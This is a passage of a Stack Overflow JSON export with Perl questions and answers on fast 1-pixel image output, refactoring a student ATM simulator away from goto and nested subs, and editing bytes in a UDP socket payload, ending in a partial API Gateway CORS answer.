rel=\"nofollow noreferrer\">nginx.org/en/docs/http/ngx_http_empty_gif_module.html</a>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1454745544, "post_id": 35238069, "comment_id": 58191668, "body": "Have you found that your code is too slow, profiled it, and found that this is a bottleneck?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1454747196, "post_id": 35238069, "comment_id": 58192088, "body": "<i>&quot;I cannot host a static file, as we need to process the request for some data&quot;</i> Are you saying that the contents of the pixel depends on parameters from an HTTP request?"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1454746976, "post_id": 35238379, "comment_id": 58192036, "body": "<i>&quot;why are you sending 167 bytes of PNG when you could be sending 42 bytes of GIF?&quot;</i> Perhaps because the time taken to transmit 125 bytes of data should be insignificant? That is probably smaller than the associated HTTP stuff"}], "tags": [], "owner": {"reputation": 21654, "user_id": 107331, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cf6d0868b2b4c69bac3e6f265a32b6a7?s=128&d=identicon&r=PG", "display_name": "Daniel Martin", "link": "https://stackoverflow.com/users/107331/daniel-martin"}, "is_accepted": false, "score": 2, "last_activity_date": 1454742519, "creation_date": 1454742519, "answer_id": 35238379, "question_id": 35238069, "link": "https://stackoverflow.com/questions/35238069/perl-improve-performance-of-generating-1-pixel-image/35238379#35238379", "title": "Perl improve performance of generating 1 pixel image", "body": "<p>First off, for high performance perl you should be using fastcgi (via the <code>FCGI</code> module directly, or the <code>CGI::Fast</code> wrapper) or mod-perl or some other technology to make your script stick around as a persistent process in memory.</p>\n\n<p>Secondly, if you're processing the request for some other data first and that involves anything like writing to a file or talking to a database or something like that, your time will be dominated by that processing. Generating the image is not the slow part.</p>\n\n<p>But let's answer your question anyway: assuming that you are using some keep-the-script-in-memory technology, then the first thing you can do is move your <code>MIME::Base64::decode</code> call to a <code>BEGIN</code> block, store the result in a variable, and use that variable.</p>\n\n<p>But also, sending the image over the wire is likely going to take longer than the processing on the server, so why are you sending 167 bytes of PNG when you could be sending 42 bytes of GIF? Put both of those pieces of advice together, and you get:</p>\n\n<pre><code>my $gifdata;\nBEGIN { $gifdata = MIME::Base64::decode(\n            \"R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\"); }\nprint $gifdata;\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 1227726, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6dcb94efb0657a5b59d2609210b53074?s=128&d=identicon&r=PG", "display_name": "Kathiresh", "link": "https://stackoverflow.com/users/1227726/kathiresh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 150, "favorite_count": 0, "closed_date": 1454753019, "answer_count": 1, "score": -5, "last_activity_date": 1454745303, "creation_date": 1454739719, "last_edit_date": 1454745303, "question_id": 35238069, "link": "https://stackoverflow.com/questions/35238069/perl-improve-performance-of-generating-1-pixel-image", "closed_reason": "Needs details or clarity", "title": "Perl improve performance of generating 1 pixel image", "body": "<p>Hi I need to generate a 1x1 pixel image in perl, what can be the fastest way to generate this. Assuming i will be getting 10K connections/per second on my web server.</p>\n\n<p>Currently i am using this :</p>\n\n<pre><code>print MIME::Base64::decode(\"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAABGdBTUEAALGPC/xhBQAAAAZQTFRF////AAAAVcLTfgAAAAF0Uk5TAEDm2GYAAAABYktHRACIBR1IAAAACXBIWXMAAAsSAAALEgHS3X78AAAAB3RJTUUH0gQCEx05cqKA8gAAAApJREFUeJxjYAAAAAIAAUivpHEAAAAASUVORK5CYII=\n</code></pre>\n\n<p>I cannot host a static file, as we need to process the request for some data.</p>\n\n<p>Thanks\nKathiresh Nadar</p>\n"}, {"tags": ["perl", "nested", "subroutine"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1454710798, "post_id": 35234220, "comment_id": 58183773, "body": "Could you please provide a <i>minimal</i> demonstration of the problem? There is far more code than required in this question. /// Please don&#39;t nest named subroutines in Perl. It doesn&#39;t help, and you can get into problems (&quot;will not stay shared&quot;). /// Please don&#39;t use <code>&amp;foo;</code>. It&#39;s a very special form of calling subs. (The called sub uses the caller&#39;s <code>@_</code>.) While <code>&amp;foo();</code> would be better, that is also special. (It instructs Perl to bypass the sub&#39;s prototype.) You should not be using <code>&amp;</code> at all."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 4, "creation_date": 1454712740, "post_id": 35234220, "comment_id": 58184519, "body": "This makes me angry. Where are you learning to use an ampersand <code>&amp;</code> to call subroutines? That hasn&#39;t been considered best practice since <a href=\"http://perldoc.perl.org/perlhist.html\" rel=\"nofollow noreferrer\">Perl v5.8 arrived in July 2002</a>. Please ignore anyone who teaches you to do that \u2014 they know less about Perl than you do"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1454744046, "post_id": 35234220, "comment_id": 58191325, "body": "@Borodin: Are you sure you mean my comments? I haven&#39;t added any here."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1454744644, "post_id": 35234220, "comment_id": 58191466, "body": "@choroba: You&#39;re right and I apologise"}], "answers": [{"tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": false, "score": 1, "last_activity_date": 1454713188, "last_edit_date": 1454713188, "creation_date": 1454713002, "answer_id": 35234944, "question_id": 35234220, "link": "https://stackoverflow.com/questions/35234220/return-value-from-nested-subroutine-perl/35234944#35234944", "title": "Return value from nested Subroutine Perl", "body": "<p>Looks cute, but there are some things you shouldn't do. I'll try to show you with the <em>choose</em> part.</p>\n\n<p>Don't call subroutines with <code>&amp;</code>, but with parentheses, i.e. <code>acc_choose();</code> instead of <code>&amp;acc_choose;</code>.</p>\n\n<p>Don't nest functions/subs in perl. If you really want to encapsulate things (which I appreciate and recommend),\nuse modules. But that's beyond the scope of this question. You'll learn about that later.</p>\n\n<p>Don't use <code>goto</code> if not absolutely neccessary. It makes the control flow weird, hard to follow, and often leads to surprises.</p>\n\n<p>If you want to repeat something <em>until</em> a certain condition is met -- or, in other words -- <em>while</em> a certain condition is <em>not</em> met, \nuse <code>while</code> loops.</p>\n\n<p>Given that, I'd suggest something like this for the <em>choose</em> part (fancy printing omitted):</p>\n\n<pre><code>sub acc_balance {\n    print \"\\nYour balance is: $acc_balance SEK\\n\\n\";\n}\n\nsub acc_withdraw {\n    my $acc_balance_withdraw = 0;\n\n    do {\n        print \"\\nEnter how much you'd like to withdraw: \\n\";\n        $acc_balance_withdraw = &lt;STDIN&gt;;\n\n        if ( $acc_balance_withdraw &gt; $acc_balance ) {\n            print \"Insufficient funds.\\n\";\n        }\n    } while( $acc_balance_withdraw &gt; $acc_balance );\n\n    # if you get here, then $acc_balance_withdraw &lt;= $acc_balance, so:      \n    $acc_balance -= $acc_balance_withdraw;\n    print \"\\nYour current balance is now: $acc_balance SEK\\n\\n\";\n}\n\n\n# actually almost the same as acc_withdraw() only with\n# other screen output and no `-=` operation \nsub acc_transfer {\n    # left as an excercise\n}\n\n\nsub acc_choose {\n\n    print \"[1] Account Balance\\n\";\n    print \"[2] Withdraw\\n\";\n    print \"[3] Transfer\\n\";\n    print \"[4] Exit\\n\";\n\n    do {\n        my $choice1 = &lt;STDIN&gt;;\n        chomp $choice1;\n\n        if ( $choice1 == 1 ) {\n            acc_balance();\n        }\n        elsif ( $choice1 == 2 ) {\n            acc_withdraw();\n        }\n        elsif ( $choice1 == 3 ) {\n            acc_transfer();\n        }\n        elsif ( $choice1 == 4 ) {\n            print \"Thank you. Good bye.\\n\"\n        }\n        else {\n            print \"You entered an invalid option. Try again. \\n\";\n        }\n    } while( $choice != 1 &amp;&amp; $choice != 2 &amp;&amp; $choice != 3 &amp;&amp; $choice != 4 );\n}\n</code></pre>\n\n<p>One issue with your attempt might be that you called <code>acc_choose()</code> recursively, i.e. you called it from within itself. Together with <code>goto</code> that can indeed have entertaining effects.</p>\n\n<p>Good luck and keep on.</p>\n\n<p>Oh, and to answer your question: It is now really simple to have the subroutines return something. It is not neccessary here because you use global variables for <code>$acc_balance</code> (don't do that either), but if you'd like to, you could let the subs return the new balance like so:</p>\n\n<pre><code>sub acc_withdraw {\n    my $old_balance = shift; # that's the first argument given to this sub\n    my $acc_balance_withdraw = 0;\n\n    do {\n        print \"\\nEnter how much you'd like to withdraw: \\n\";\n        $acc_balance_withdraw = &lt;STDIN&gt;;\n\n        if ( $acc_balance_withdraw &gt; $old_balance ) {\n            print \"Insufficient funds.\\n\";\n        }\n    } while( $acc_balance_withdraw &gt; $old_balance );\n\n    # if you get here, then $acc_balance_withdraw &lt;= $acc_balance, so:      \n    my $new_balance = $old_balance - $acc_balance_withdraw;\n    print \"\\nYour current balance is now: $new_balance SEK\\n\\n\";\n    return $new_balance;\n}\n\n# and then...\n\n$acc_balance = acc_withdraw($acc_balance);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1454713731, "post_id": 35234994, "comment_id": 58184901, "body": "That&#39;s a lot cleaner than my solution but I think it also is more puzzling to the OP as it introduces hashes to subroutines and even anonymous subs. It&#39;s a good answer, but not for the OP, I guess."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1454715799, "post_id": 35234994, "comment_id": 58185607, "body": "I think your <code>while</code> loop should use <code>&amp;&amp;</code> instead of <code>||</code> to build the expression with <code>defined $firstname ...</code>"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1454716501, "post_id": 35234994, "comment_id": 58185766, "body": "@PerlDog: Is it OK to only have the first name set, but not last name?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1454745101, "post_id": 35234994, "comment_id": 58191560, "body": "That&#39;s a lot of code to allow someone&#39;s name to be <code>0</code>!"}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 0, "last_activity_date": 1454713238, "creation_date": 1454713238, "answer_id": 35234994, "question_id": 35234220, "link": "https://stackoverflow.com/questions/35234220/return-value-from-nested-subroutine-perl/35234994#35234994", "title": "Return value from nested Subroutine Perl", "body": "<p>I removed the formatting and colouring, as it's irrelevant to the question. Here's how you can do it: everything a subroutine needs gets from its arguments, everything it changes is returned.</p>\n\n<pre><code>#! /usr/bin/perl\nuse warnings;\nuse strict;\nuse feature qw{ say };\n\nsub create {\n    print &lt;&lt; 'END_MSG';\n\nDear Sir or Madam,\n\nWe're very happy you've chose us as your bank.\nBefore we proceed, we need to set-up your account.\n\nEND_MSG\n\n    my ($firstname, $lastname);\n\n    my $first = 1;\n    while (! defined $firstname || ! defined $lastname\n           || q() eq $firstname || q() eq $lastname\n          ) {\n        say \"You didn't fill in first or last name. Try again.\" unless $first;\n        undef $first;\n\n        print \"\\nYour first name: \";\n        chomp( $firstname = &lt;STDIN&gt; );\n\n        print \"\\nYour last name: \";\n        chomp( $lastname = &lt;STDIN&gt; );\n    }\n\n    say \"Please wait while the system loads.\\n\";\n\n    say \"\\nWelcome \", $firstname, \" \", $lastname, \"!\\n\";\n    return ($firstname, $lastname)\n}\n\nsub choose {\n    my $balance = 2451.26;\n    my @menu = ( 'Account Balance',\n                 'Withdraw',\n                 'Transfer',\n                 'Quit',\n               );\n    my $choice = q();\n\n    until ('4' eq $choice) {\n        for my $i (0 .. $#menu) {\n            say '[ ', $i + 1, ' ] ', $menu[$i];\n        }\n\n        chomp( $choice = &lt;STDIN&gt; );\n\n        my @actions = (\\&amp;balance,\n                       \\&amp;withdraw,\n                       \\&amp;transfer,\n                       sub {}\n                      );\n        my $action = $actions[$choice - 1];\n\n        if ($action) {\n            my $value = $action-&gt;($balance);\n            $balance = $value if defined $value;\n        } else {\n            say 'You entered an invalid option. Try again.';\n        }\n    }\n}\n\nsub balance {\n    my $balance = shift;\n    say \"\\nYour balance is: $balance SEK\\n\\n\";\n    return $balance\n}\n\nsub withdraw {\n    my $balance = remove('withdraw', @_);\n    return $balance\n}\n\nsub transfer {\n    my $balance = remove('transfer', @_);\n    return $balance\n}\n\nsub remove {\n    my ($action, $balance) = @_;\n\n    say \"\\nEnter how much you'd like to $action:\\n\";\n    my $remove = &lt;STDIN&gt;;\n\n    if ( $remove &gt; $balance ) {\n        print \"Insufficient funds.\";\n    } else {\n        $balance -= $remove;\n    }\n    balance($balance);\n}\n\nmy ($firstname, $lastname) = create();\nchoose();\nsay \"Good bye, $firstname $lastname!\";\n</code></pre>\n\n<p>Nested subroutines are not nested the same way as in Pascal. In fact, you can't nest named subroutines in Perl.</p>\n\n<p>As shown, only use <code>&amp;</code> when you need a reference to a subroutine.</p>\n\n<p>Don't use <code>goto</code>. Loops are easier to understand and manage.</p>\n\n<p>Also, make sure you don't erase the screen immediately after printing an important message (\"Insufficient funds\").</p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 4, "last_activity_date": 1454714016, "creation_date": 1454714016, "answer_id": 35235139, "question_id": 35234220, "link": "https://stackoverflow.com/questions/35234220/return-value-from-nested-subroutine-perl/35235139#35235139", "title": "Return value from nested Subroutine Perl", "body": "<p>I think you shouldn't be using subroutines for this assignment. But it worries me that someone has told you to use an ampersand <code>&amp;</code> when you call a subroutine and has explained how to use labels and <code>goto</code>. That's inappropriate for a modern computer language and you can do much better</p>\n\n<p>For instance, here's how I would write your subroutine <code>acc_create</code></p>\n\n<pre><code>sub acc_create {\n\n    while () {\n\n        print \"\\nYour first name: \";\n        chomp (my $firstname = &lt;STDIN&gt;);\n\n        print \"\\nYour last name: \";\n        chomp (my $lastname = &lt;STDIN&gt;);\n\n        last if $firstname and $lastname;\n\n        print \"You didn't fill in first or last name. Try again.\\n\";\n    }\n\n    print \"Please wait while the system loads.\\n\\n\";\n\n    print\n        $clr_scr,\n        color('green'), $atm-&gt;center(\"ATM v. 1.20\"), color('reset');\n\n    print \"\\nWelcome $firstname $lastname!\\n\\n\";\n}\n</code></pre>\n\n<p>There's a lot more I could say, but Stack Overflow isn't the place for a tutorial</p>\n"}], "owner": {"reputation": 430, "user_id": 5872381, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/fqwid.png?s=128&g=1", "display_name": "tobulos1", "link": "https://stackoverflow.com/users/5872381/tobulos1"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 162, "favorite_count": 1, "accepted_answer_id": 35235139, "answer_count": 3, "score": 0, "last_activity_date": 1454714016, "creation_date": 1454709355, "question_id": 35234220, "link": "https://stackoverflow.com/questions/35234220/return-value-from-nested-subroutine-perl", "title": "Return value from nested Subroutine Perl", "body": "<p>We've received an assignment from school, where we're supposed to make our own small n' simple Perl application. I thought I'd make a ATM simulator. So far, it's been going great; I've created a menu (Withdraw, Balance, Transfer), by using subroutines. This is my code so far:</p>\n\n<pre><code>#! /usr/bin/perl\n#Written by: Tobias Svenblad, h15tobsv@du.se, Digitalbrott &amp; e-S\u00e4kerhetsprogrammet (2015)\n#PerlLab03-2c.plx\n\nuse warnings;\nuse strict;\nuse Term::ANSIColor;\nuse Text::Format;\n\nmy $firstname;\nmy $lastname;\nmy $acc_balance = 2451.26;\nmy $acc_withdraw;\nmy $clr_scr = join( \"\", ( \"\\033[2J\", \"\\033[0;0H\" ) );    #This variable will clear the screen and jump to postion 0, 0.\n\nmy $atm = Text::Format-&gt;new;\nprint color('green');\nprint $atm-&gt;center(\"ATM v. 1.20\");\nprint color('reset');\n\n#Create account message.\nmy $crt_acc_msg = &lt;&lt;\"END_MSG\";\n\\nDear Sir or Madam,\\n\nWe're very happy you've chose us as your bank.\nBefore we proceed, we need to set-up your account.\\n\nEND_MSG\n\nprint $crt_acc_msg;\n\n&amp;acc_create;\n&amp;acc_choose;\n\nsub acc_create {\n  ACC_BEGINNING:\n\n    #First name:\n    print \"\\nYour first name: \";\n    $firstname = &lt;STDIN&gt;;\n    chomp $firstname;\n\n    #Last name:\n    print \"\\nYour last name: \";\n    $lastname = &lt;STDIN&gt;;\n    chomp $lastname;\n    if ( defined($firstname) &amp;&amp; $firstname ne \"\" ) {\n        if ( defined($lastname) &amp;&amp; $lastname ne \"\" ) {\n            goto ACC_PASS;\n        }\n    }\n    else {\n        print \"You didn't fill in first or last name. Try again. \\n\";\n        goto ACC_BEGINNING;\n    }\n  ACC_PASS:\n    print \"Please wait while the system loads.\\n\\n\";\n\n    #sleep(2);\n    print $clr_scr;\n\n    print color('green');\n    print $atm-&gt;center(\"ATM v. 1.20\");\n    print color('reset');\n\n    print \"\\nWelcome \", $firstname, \" \", $lastname, \"!\\n\\n\";\n}\n\nsub acc_choose {\n\n    sub acc_balance {\n        print $clr_scr;\n\n        print color('green');\n        print $atm-&gt;center(\"ATM v. 1.20\");\n        print color('reset');\n\n        print \"\\nYour balance is: \";\n        print color('green');\n        print $acc_balance;\n        print color('reset');\n        print \" SEK\\n\\n\";\n        &amp;acc_choose;\n    }\n\n    sub acc_withdraw {\n\n      ENTER_AMOUNT:\n        print $clr_scr;\n\n        print color('green');\n        print $atm-&gt;center(\"ATM v. 1.20\");\n        print color('reset');\n\n        print \"\\nEnter how much you'd like to withdraw: \\n\";\n        my $acc_balance_withdraw = &lt;STDIN&gt;;\n\n        if ( $acc_balance_withdraw &gt; $acc_balance ) {\n            print \"Insufficient funds.\";\n            goto ENTER_AMOUNT;\n        }\n        $acc_balance -= $acc_balance_withdraw;\n        print \"\\nYour current balance is now: \";\n        print color('green');\n        print $acc_balance;\n        print color('reset');\n        print \" SEK\\n\\n\";\n        &amp;acc_choose;\n    }\n\n    sub acc_transfer {\n      ENTER_AMOUNT:\n        print $clr_scr;\n\n        print color('green');\n        print $atm-&gt;center(\"ATM v. 1.20\");\n        print color('reset');\n\n        print \"\\nEnter how much you'd like to transfer: \\n\";\n        my $acc_balance_withdraw = &lt;STDIN&gt;;\n\n        if ( $acc_balance_withdraw &gt; $acc_balance ) {\n            print \"Insufficient funds.\";\n            goto ENTER_AMOUNT;\n        }\n\n        print \"\\nYour current balance is now: \";\n        print color('green');\n        print $acc_balance - $acc_balance_withdraw;\n        print color('reset');\n        print \" SEK\\n\\n\";\n        &amp;acc_choose;\n    }\n  ACC_CHOOSE:\n    print \"[ \";\n    print color('cyan');\n    print \"1\";\n    print color('reset');\n    print \" ]\";\n    print \"Account Balance\\n\";\n    print \"[ \";\n    print color('cyan');\n    print \"2\";\n    print color('reset');\n    print \" ]\";\n    print \"Withdraw\\n\";\n    print \"[ \";\n    print color('cyan');\n    print \"3\";\n    print color('reset');\n    print \" ]\";\n    print \"Transfer\\n\";\n    my $choice1 = &lt;STDIN&gt;;\n    chomp $choice1;\n\n    if ( $choice1 == 1 ) {\n        &amp;acc_balance;\n    }\n    elsif ( $choice1 == 2 ) {\n        &amp;acc_withdraw;\n    }\n    elsif ( $choice1 == 3 ) {\n        &amp;acc_transfer;\n    }\n    else {\n        print \"You entered an invalid option. Try again. \\n\";\n        goto ACC_CHOOSE;\n    }\n    return ();\n}\n</code></pre>\n\n<p>The problem I face is when I try to return the <code>$acc_balance</code> value to the other subroutines. I've tried to implement <code>return($acc_balance );</code> underneath the nested subroutines, but that'll just prompt me to end the application. So basically, what I'm trying to do is to update <code>$acc_balance</code> every time I make a withdrawal or transfer (they are both currently the same thing in this code), but whenever I try to do that, it either doesn't update the value or it'll just show the classic <code>\"Press any key to continue...\"</code> message.</p>\n\n<p>Any help is greatly appreciated! Thanks!</p>\n"}, {"tags": ["arrays", "perl", "sockets", "hex", "byte"], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1454710977, "creation_date": 1454710977, "answer_id": 35234567, "question_id": 35234110, "link": "https://stackoverflow.com/questions/35234110/i-cannot-modify-hex-string-for-socket-communication/35234567#35234567", "title": "I cannot modify hex string for socket communication", "body": "<pre><code>my $data = join '', map chr, @data;\n</code></pre>\n\n<p>or</p>\n\n<pre><code>my $data = pack 'C*', @data;\n</code></pre>\n\n<hr>\n\n<p>Of course, you don't need to convert the whole string into individual numbers.</p>\n\n<pre><code>my @ip_octets = ( 10, 20, 31, 1 );\nmy $data= \"\\x0f\\x00\\x00\\x00\\x00\\x00\" . pack('C*', @ip_octets);\n</code></pre>\n\n<p>Better yet, let's start with an actual IP address.</p>\n\n<pre><code>use Socket qw( inet_aton );\n\nmy $ip_addr = '10.20.31.1';\nmy $data= \"\\x0f\\x00\\x00\\x00\\x00\\x00\" . inet_aton($ip_addr);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 21, "user_id": 1339750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d11b14b7091d3953b4531b560e8c14b5?s=128&d=identicon&r=PG", "display_name": "user1339750", "link": "https://stackoverflow.com/users/1339750/user1339750"}, "edited": false, "score": 0, "creation_date": 1454776013, "post_id": 35234586, "comment_id": 58200654, "body": "I actually added additional question below."}], "tags": [], "owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "is_accepted": false, "score": 0, "last_activity_date": 1454711067, "creation_date": 1454711067, "answer_id": 35234586, "question_id": 35234110, "link": "https://stackoverflow.com/questions/35234110/i-cannot-modify-hex-string-for-socket-communication/35234586#35234586", "title": "I cannot modify hex string for socket communication", "body": "<p>To change a part of a string in perl you can use <code>substr</code>as a lvalue like this:</p>\n\n<pre><code>substr($data,6,1) = \"\\x0a\";\nsubstr($data,7,1) = \"\\x14\";\nsubstr($data,8,1) = \"\\x1f\";\nsubstr($data,9,1) = \"\\x02\";\n</code></pre>\n\n<p>or </p>\n\n<pre><code>substr($data,6,4) = \"\\x0a\\x14\\x1f\\x01\";\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 1339750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d11b14b7091d3953b4531b560e8c14b5?s=128&d=identicon&r=PG", "display_name": "user1339750", "link": "https://stackoverflow.com/users/1339750/user1339750"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 76, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1454775944, "creation_date": 1454708824, "question_id": 35234110, "link": "https://stackoverflow.com/questions/35234110/i-cannot-modify-hex-string-for-socket-communication", "title": "I cannot modify hex string for socket communication", "body": "<p>I'm a newbie for perl programming.\nWhat I'm trying to do is send some hex string over a socket.\nThe below is a perl code I'm writing.\nIt works perfectly.\nBut I need to modify the hex string from 7th byte to 10th byte which is IP address.</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse IO::Socket::INET;\nmy $data= \"\\x0f\\x00\\x00\\x00\\x00\\x00\\x0a\\x14\\x1f\\x01\";\n# create a socket\nmy $sock = new IO::Socket::INET(\n      PeerAddr=&gt;'192.168.1.101',\n      PeerPort=&gt;'8121',\n      Proto=&gt;'udp) or die $!;\n# send some data to server\n$sock-&gt;send($data);\n$sock-&gt;close();\nexit(0);\n</code></pre>\n\n<p>But I don't know how to modify the IP address section of $data.\nIf I use like below,</p>\n\n<pre><code>my @data= (0x0f,0x00,0x00,0x00,0x00,0x00,0x0a,0x14,0x1f,0x01);\n</code></pre>\n\n<p>I can access the data and modify like below.</p>\n\n<pre><code>$data[6] = 0x0a;\n$data[7] = 0x14;\n$data[8] = 0x1f;\n$data[9] = 0x02;        \n</code></pre>\n\n<p>But I don't know how to modify $data like this.\nPlease give me some idea!\nThanks in advance.</p>\n"}, {"tags": ["json", "perl", "amazon-web-services", "aws-cli", "aws-api-gateway"], "answers": [{"comments": [{"owner": {"reputation": 684, "user_id": 348503, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/d42b73c51c0f653b9eb98629a98e86b8?s=128&d=identicon&r=PG", "display_name": "Andy N", "link": "https://stackoverflow.com/users/348503/andy-n"}, "edited": false, "score": 0, "creation_date": 1599679467, "post_id": 35232121, "comment_id": 112851207, "body": "When you enable cors through console. It adds an options method to the endpoint. Wondering if this is actually needed? I never needed to add options method in a node.js web app."}], "tags": [], "owner": {"reputation": 5998, "user_id": 5679071, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d53663c7e46e308f3578a2e99c79996?s=128&d=identicon&r=PG&f=1", "display_name": "jackko", "link": "https://stackoverflow.com/users/5679071/jackko"}, "is_accepted": true, "score": 2, "last_activity_date": 1454700941, "creation_date": 1454700941, "answer_id": 35232121, "question_id": 35228488, "link": "https://stackoverflow.com/questions/35228488/api-gateway-cors-setup/35232121#35232121", "title": "api gateway CORS setup", "body": "<p>The API Gateway management console has a nice 'Enable CORS' feature, which you may have seen. As far as replicating using the CLI, I'd suggest using the console feature, observing the configuration afterwards, and using the same parameters in the CLI requests.</p>\n\n<p>The error you're seeing must be caused by incorrect escaping of the single quotes for the value '*' because just the character * would not be valid. Also just to point out another potential problem, the input to --response-templates '{\"application/json\":\"Empty\"}' is valid but is not interpreted the same as --response-models in a method-response object. That value will set the response body to \"Empty\" for all API calls that use that integration-response. To do a passthrough, just don't set the value of --response-templates </p>\n"}, {"tags": [], "owner": {"reputation": 312, "user_id": 841759, "user_type": "registered", "profile_image": 